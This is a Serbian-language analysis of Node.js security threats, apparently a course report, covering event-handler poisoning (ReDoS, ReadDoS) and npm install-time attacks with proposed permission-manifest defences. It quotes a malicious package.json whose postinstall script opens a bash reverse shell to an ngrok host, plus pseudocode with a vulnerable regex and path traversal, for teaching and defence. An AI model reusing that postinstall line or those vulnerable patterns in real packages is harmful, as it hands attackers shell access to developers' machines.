# Analiza ranjivosti, napada i mitigacija za NodeJs i Mongo tehnologije

## Uvod
U narednim poglavljima biće prikazan deo sistema koji će biti analiziran, data stabla napada za odgovarajuće napade, kao i biti priložen propratni tekst za ta stabla.

## Deo sistema koji se analizira
![Dijagram](/Dijagrami/NodeMongo.jpg)

## NodeJs
NodeJs je jedna od najpopularnijih tehnologija koje se danas koriste za implementaciju backend sistema. Ono što ovu tehnologiju čini zanimljivom za analizu jeste njena modularnost, odnosno korišćenje Node Package Manager-a (NPM) za ubacivanje zavisnosti i paketa koji su drugi developeri implementirali. Dovoljno je da se u nekom od "čvorova" u lancu zavisnosti pronađe neka ranjivost, da bi se ta ranjivost kasnije eksploatisala u kranjem proizvodu. U nastavku sledi detaljan opis tri vrste ranjivosti koje se mogu naći u softverima koje koriste ovu tehnologiju: Event Handler Poisoning [[1]](#reference), Install-Time Attacks [[2]](#reference) i Prototype Pollution Vulnerability.

### Event Handler Poisoning
Suština ovakvih napada jeste usporavanje rada niti koje opslužuju klijentske zahteve tako što se unose podaci koji teraju algoritme da obrađuju najgori mogući slučaj, umesto prosečni.

#### Stablo napada
![Dijagram](/Dijagrami/EventHandlerPoisoningAttackTree.jpg)

#### Potrebne informacije
NodeJs koristi arhitekturu vođenu događajima (Event driven architecture, EDA). EDA multipleksira mnoštvo klijentskih zahteva na mali broj Event Handler-a, da bi se umanjio gubitak performansi pri prelasku sa jedne na drugu nit (context switching overhead). Event handler-i se sastoje od jednonitnog Event Loop-a, kao i malog Worker pool-a koji služi za obradu skupih operacija. Nasuprot ove arhitekture, postoji i arhitektura u kojoj se svakom klijentu dodeljuje jedna nit (One Thread Per Client Architecture, OTPCA). Prednost ovakvog rešenja jeste izolovanost svakog klijenta, kao i smanjenje rizika pri usporenom radu jedne niti (ako nastane problem, nit se samo "uništava", i kreira se nova), dok je mana već pomenut gubitak performansi usled "skakanja" s jedne niti na drugu. 

Svi najpoznatiji serverski EDA radni okviri koriste asimetričnu multi-procesnu arhitekturu vođenu događajima. Operativni sistem, ili radni okvir događaje smeštaju u redove, a odgovarajuće callback funkcije se izvršavaju sekvencijalno od strane Event Loop-a. U slučaju obrada skupih zahteva, poput čitanja i pisanja u datoteku, Event Loop može da taj zahtev prosledi Worker Pool-u, koji nakon završetka vraća povratnu informaciju Event Loop-u. Za svaki callback mora biti zagarantovana atomičnost, odnosno njeno izvršavanje se uvek dešava u celosti. Ako se event handler "zaglavi", vreme provedeno u tom stanju je protraćeno.

NodeJs radni okvir se sastoji iz tri dela: Google-ov V8 JavaScript engine koji izvršava JavaScript kod, libuv biblioteke, pomoću koje je implementirana EDA, i JavaScript biblioteka koje koriste C++ za sistemske pozive.

#### Opis napada
Činjenica da NodeJs koristi relativno mali broj niti (event handler-a) da opslužuje svoje klijente za posledicu ima to da ako zahtev od strane napadača natera nekog od handler-a da nedopustivo dugo vremena provede na njemu, može da uspori rad čitavog sistema, a čak može i da spreči opsluživanje ostalih klijenata. Ovakva vrsta napada naziva se Event Handler Poisoning (EHP), i relativno je česta kod NPM modula.

EHP napad se može izvesti nad Event Loop-om ili nad radnicima u Worker Pool-u. "Otrovani" Event Loop blokira čitav server, dok će svaki napadnuti Worker postepeno usporavati rad sistema. Napad je jedino moguć iz razloga što se resursi za izvršavanje dele. Kod OTPCA arhitekture blokirani klijent utiče samo na svoju nit, a radni okviri poput Apache nude hiljade event handler-a. Nasuprot tome, NodeJs Worker Pool može sadržati najviše 128 radnika. Potrošiti sve event handler-e u OTPCA sistemima se može postići samo DDoS napadom, dok se ista stvar u EDA sistemima može trivijalno postići ako se pronađe EHP ranjivost.

Sledi opis i pseudo kod za 2 primera EHP napada: ReDos i ReadDos.

```
1 def serveFile ( name ) :
2 if name . match (/(\/.+) + $ /) : # ReDoS
3 data = await readFile ( name ) # ReadDoS
4 client . write ( data )
```

Regularni izraz u 2. liniji je ranjiv na ReDoS. String sačinjen od '/' karaktera, nakon kojih sledi nova linija zahteva eksponencijalno vreme za evaluaciju od strane NodeJs-ovog engina za regularne izraze, čime se truje Event Loop. Druga ranjivost prikazana je na 3. liniji. Server poseduje ranjivost pri obilasku direktorijuma, dozvoljava klijentima da čitaju proizvoljne datoteke. Ako napadač može da identifikuje datoteku koja prouzrokuje sporo člitanje, može da izvede ReadDos napad. Svaki ReadDos napad će otrovati radnika iz Worker Pool-a. Jedini način da se resursi oslobode bi bio da se server pokrene ponovo, čime bi se sve konekcije sa klijentima prekinule. Međutim, to nije rešenje za problem, jer napadač može ponovo da uputi maliciozni zahtev, čime bi se resursi opet zauzeli.

#### Mitigacije
EHP ranjivosti proizilaze od ranjivih API-a koji nemaju adekvatno implementirane mehanizme za paralelno izvršavanje. Ako servis ne može da ograniči vreme izvršavanja svojih funkcija, on je ranjiv na EHP napade. Postoje dva načina da se sistem odbrani od EHP napada. Jedan način je da se ranjivi API refaktoriše, a drugi da se implementira način detekcije i "lečenja" otrovanog event handler-a. Sledi opis oba načina rešavanja problema, gde će fokus biti dat na drugom.

##### Sprečavanje putem particionisanja
Api je ranjiv ako postoji razlika između prosečne i najveće cene izvršavanja, uz to da je najgori slučaj nedopustiv. Servis može postići sigurnost statičkim ograničavanjem svakog od njegovih API-a, i onih koje poziva, i onih koje sam definiše. Na primer, developer bi mogao da particioniše svaki API u sekvencu faza koje imaju konstantno najduže vreme izvršavanja. Takva podela bi servis učinila imunim na EHP napade, jer bi ograničila sinhronu kompleksnost i vreme izvršavanja.

##### Otkrivanje i reagovanje koristeći timeout-ove
Umesto da statički ograničavamo kompleksnost API-a kroz refaktorisanje, isti rezultat možemo postići i dinamički, koristeći timeout-ove. Najgori slučaj pri izvršavanju bi postao irelevantan, jer nijedan callback ni task nebi mogao da prekorači vreme izvršavanja koje mu je dodeljeno. U ovom pristupu, svaki callback ili task koji se predugo izvršava se detektuje i prekida, bacajući TimeoutError, koji se baca iz sinhronog koda (callbacks) i vraća iz asinhronog koda (tasks). Problem kod ovog pristupa jeste izabrati odgovarajući prag vremena, jer preveliki prag i dalje dozvoljava napadaču da uspešno izvrči EHP napad, a premali bi mogao da prekine legitimne zahteve. 

Oba načina zahtevaju refaktorisanje, međutim timeout način iziskuje manje troškove, jer dodatak nogog try-catch bloka je dosta lakše postići nego ponovo implementirati funkcionalnosti da bi bile adekvatno particionisane. Iako je princip timeout-ova jednostavan, implementacija u pravom radnom okviru poput NodeJs-a je izazovno. Svaki deo NodeJs radnog okvira bi morao da emituje TimeoutError bez kompromitovanja stanja sistema, počev od samog jezika, do biblioteka i logike u samim aplikacijama, i u sinhronim i u asinhronim aspektima. Callback funkcija koja se predugo izvršava truje Event Loop, pa je potrebno baciti TimeoutError u takvom callback-u. Task koji se dugo izvršava truje Worker-a. Takav Worker mora biti prekinut i ispunjen putem TimeoutError-a.

### Install-Time Napadi
Suština ovakvih napada jeste ugrađivanje malicioznog koda u skriptama za instalaciju paketa od kojih drugi poznati paketi zavise. Kod se krije duboko u lancu zavisnosti tih paketa, i na taj način se propagira. Korisnik kada skine paket koji je kompromitovan, ili koji zavisi od nekog drugog kompromitovanog paketa neznajući pokreće neželjene skripte, a da paket nije ni instalirao niti importovao.

#### Stablo napada
![Dijagram](/Dijagrami/InstallTimeAttackAttackTree.jpg)

#### Potrebne informacije
Većina npm paketa poseduje ograničene potrebe vezane za konfuguraciju, odnosno nije im potrebno ništa osim skidanja JavaScript izvornog koda i smeštanja tog koda na putanju koja je poznata projektu koji će da ga koristi. U praksi, međutim, postoje paketi koji zahtevaju pomoćne bootsrapping akcije tokom instalacije, kao što je pisanje konfiguracionih datoteka ili kompajliranje koda koji će kasnije biti korišćen. Da bi se čitav ovaj proces automatizovao, npm paketi imaju dozvolu da registruju shell skripte koje se pokreću kao odgovor na određene događaje tokom procesa instalacije. Konkretno, mogu registrovati preinstall skripte koje se pokreću pre instalacije paketa, kao i install i postinstall skripte koje se pokreću za vreme, kao i nakon što se instalacija završila. Čitav proces predstavljen je na slici ispod.

![Slika1](/Dijagrami/NpmPackageInstallatinActionOrder.jpg)


#### Opis napada
U mnogim repozitorijumima paketi su opremljeni rutinama koje dozvoljavaju bootsrapping. Skripte ubačene u ovakve bootsrap mehanizme, u najvećem broju slučajeva, se pokreću nakon instalacije paketa. Kao rezultat toga, napad može da bude izvršen a da paket nikada nije bio pokrenut, niti importovan od strane žrtve. Čak i kada te skripte nisu eksplicitno dizajnirane da proizvedu štetu, njihovo ponašanje može i dalje biti neželjeno od strane developera. Pomenute skripte se pokreću sa istim dozvolama kao i korisnik koji ih je pokrenuo, što dodatno pogoršava čitavu situaciju ako je korisnik ujedno i administrator.

Iako shell skripte nude znatnu fleksibilnost kod konfigurisanja paketa, takođe omogućavaju malicioznim paketima da ozbiljno naštete sistemima na kojim su instalirani. Sledi primer paketa koji u sebi sadrži malicioznu skriptu koja otvara reverse shell ka određenoj destinaciji na internetu.

<pre>
{
  "name": "twilio-npm",
  "version": "1.0.1",
  "description": "",
  "main": "index.js",
  "scripts": {
  "test": "echo \"Error: no test specified\" && exit 1",
  <span style="color:red"><b>"postinstall": "bash -i >& /dev/tcp/4.tcp.ngrok.io/11425
  0>&1"</b></span>
  },
  "author": "",
  "license": "ISC”
}
</pre>

Ovakve skripte korišćene su da bi se izveli napadi na razne pretnje, uključujući narušavanje integriteta sistema, izvlačenje/uklanjanje kredencijala iz sistema, ometanje operacija host mašine, davanje pristupa žrtvinoj mašini napadačima. Ove pretnje su omogućene jer se skripte pokreću sa privilegijama korisnika koji ih je pokrenuo, koji često ima dozvolu da pristupi internetu.

#### Mitigacije
Novije verzije npm-a sadrže određene mitigacije za napade na ovakvu vrstu ranjivosti. Međutim, one često ne zadovoljavaju potrebe ni osoba koje rade na održavanju registra npm paketa, ni developera, jer ili kvare funkcionalnost paketa (na primer npm može biti iskonfigurisan da skroz ignoriše skripte prilikom instalacije, a koje mogu biti neophodne za rad paketa), ili stvaraju veliki teret na održavaoce registra (na primer nud npm audit opciju, koja prikazuje ručno označene bezbednosne probleme, a koja bi se morala ručno pokretati).

U domenu bezbednosti repozitorijuma paketa NodeSource nudi usluge za proveravanje npm paketa u formi sertifikovanih modula, tako što označava npm pakete i pridodaje informacije vezane za bezbednost. Cilj je da se omogući korisnicima da donesu informisane odluke vezane za rizike koje nosi instalacija paketa. Pored toga, ovaj servis nudi informacije o tome da li paket izvršava install-time skripte. Međutim, ne prikazuje detalje o tome šta te skripte zapravo rade. Package Analysis [[3]](#reference) je još jedan alat koji proverava open source pakete i eksportuje informacije o njihovom ponašanju. Iako ovaj alat daje uvid o ponašanju install skripti, ne poseduje nikakav mehanizam za presretanje i sprečavanje neželjenog ponašanja.

Pri implementaciji mitigacija ovakvih problema važno je razdvojiti detekciju od sprovođenja, jer nisu svi bezbednosni problemi praktično relevantni u svim kontekstima. Potrebno je omogućiti dve stvari: dozvoliti održavaocima registra da spreče postavljanje malicioznih paketa na repozitorijum, i omogućiti korisnicima da kontrolišu ponašanje paketa pri njihovoj instalaciji. Operativno, politika održavaoca registra može biti primenjena u pozadini svaki put kada se paket otpremi na repozitorijum. Slično, svaki put kad korisnik unese <i>npm install p</i> komandu (gde je p ime nekog paketa), mora biti osigurano da paket p, kao i svi paketi od kojih on direktno ili indirektno zavisi, mogu da izvrše pri instalaciji samo one opeacije koje je korisnik dozvolio. Izražavanje tih dozvola bi moglo biti omogućeno korišćenjem posebnog jezika specifičnog za domen. Ove dozvole funkcionišu na osnovu manifesta dozvola koje će određeni paket koristiti tokom svog procesa instalacije. Bitna stvar kod implementacije rešenja jeste to da radi bez saradnje sa individualnim autorima paketa. Konkretno, ne sme biti neophodno da se manifesti paketa deklarišu od strane autora. Razlog za to je što postoji ogroman broj paketa, pa tako nešto nebi bilo realno moguće sprovesti. Pored toga, ciljevi određenih autora ne moraju nužno da se poklapaju sa ciljevima korisnika. Dakle, sistem mora da izvede manifest određenog paketa, a zatim da obezbedi da se taj manifest poklapa sa korisnikovom politikom.

Sistem bi se izvršavao u 3 faze: u prvoj fazi se kreira manifest za paket koji se instalira, u drugoj se taj manifest poredi sa politikama koje je korisnik deklarisao, a u trećoj se install skripte paketa pokreću i izvršavaju pod zaštitom bezbednosnog modula na nivou kernela. Sledi prikaz toka izvršavanja sistema.

![Slika1](/Dijagrami/InstallScriptSystemWorkflow.jpg)

##### Faza 1
U ovoj fazi se identifikuju svi paketi koji definišu install skripte i generiše manifest svih akcija koje se izvršavaju nad operativnim sistemom tokom poziva svake skripte. Ponašanje paketa koji se testira se nadgleda i snima u log datoteku, koja se nakon toga kompajlira u manifest. Nakon generisanja, manifest se skladišti u manifest bazu podataka i beleži se ime paketa i njegova verzija. Manifesti se generišu čak i kada se skripte sruše tokom izvršavanja. Važno je zabeležiti ponašanja problematičnih skripti, jer mogu izvršiti neželjene operacije pre nego što se sruše.

##### Faza 2
Kada korisnik želi da instalira paket, proverava se politika koju je korisnik definisao nasuprot manifesta tog paketa i njegovih zavisnosti koje se pokušavaju instalirati. Svaki manifest se dobavlja iz baze podataka. Tokom sprovođenja manifesta, pravila politike se evaluiraju u boolean vrednost (da li su ispunjena ili nisu). Sledi primer politike.

<pre>
{"<b>declarations</b>": [
  "<allRemoteHosts> = [remoteHosts_preinstall] ~union
  [remoteHosts_install] ~union
  [remoteHosts_postinstall]",
  "<allFilesRead> = [filesRead_preinstall] ~union
  [filesRead_install] ~union
  [filesRead_postinstall]",
  "<<passwdFile>> = '/etc/passwd’”],
  "<b>rules</b>": ["<allRemoteHosts> == {}",
  "!(<allFilesRead> ~anymatches [<<passwdFile>>])"]}
</pre>

Navedena su dva pravila, pravilo jedan sprečava uspostavljanje veze sa udaljenim serverima, dok pravilo dva sprečava čitanje datoteke koja se nalazi na <b><i>/etc/-passwd</i></b> putanji. Kada dođe do kršenja politike korisnik se obaveštava, i dobija informacije o tome koji paket je prouzrokovao prekršaj, kao i pravilo koje nije bilo ispoštovano.

##### Faza 3
U trećoj fazi se skripte izvršavaju pod zaštitom bezbednosnog modula. Primer takvog modula jeste AppArmor [[4]](#reference).

##### Podrazumevane politike
Iako svaki korisnik treba da ima mogućnost da deklariše svoje politike koje najviše odgovaraju njegovim potrebama, važno je implementirati i podrazumevane politike, kako bi korisnici sa što manje napora mogli da koriste sistem, pod uslovom da mu podrazumevane politike odgovaraju. S tim u vezi, postojale bi dve različite podrazumevane politike, za developere, kao i za održavaoce registra. Pravila politike namenjene developerima bi dozvoljavala skriptama da štampaju izlaze na terminal, kao i da čitaju datoteke koje nisu osetljive, dok bi zabranile uspostavljanje veze sa mrežnim serverima. Pravila politike namenjene održavaocima registra bi se odredila na osnovu algoritma za učenje, koji je formulisan na osnovu istorijskih povlačenja paketa od strane održavalaca npm-a.

# Reference
[1] https://www.usenix.org/system/files/conference/usenixsecurity18/sec18-davis.pdf

[2] https://dl.acm.org/doi/pdf/10.1145/3488932.3523262

[3] https://github.com/ossf/package-analysis

[4] https://gitlab.com/apparmor/apparmor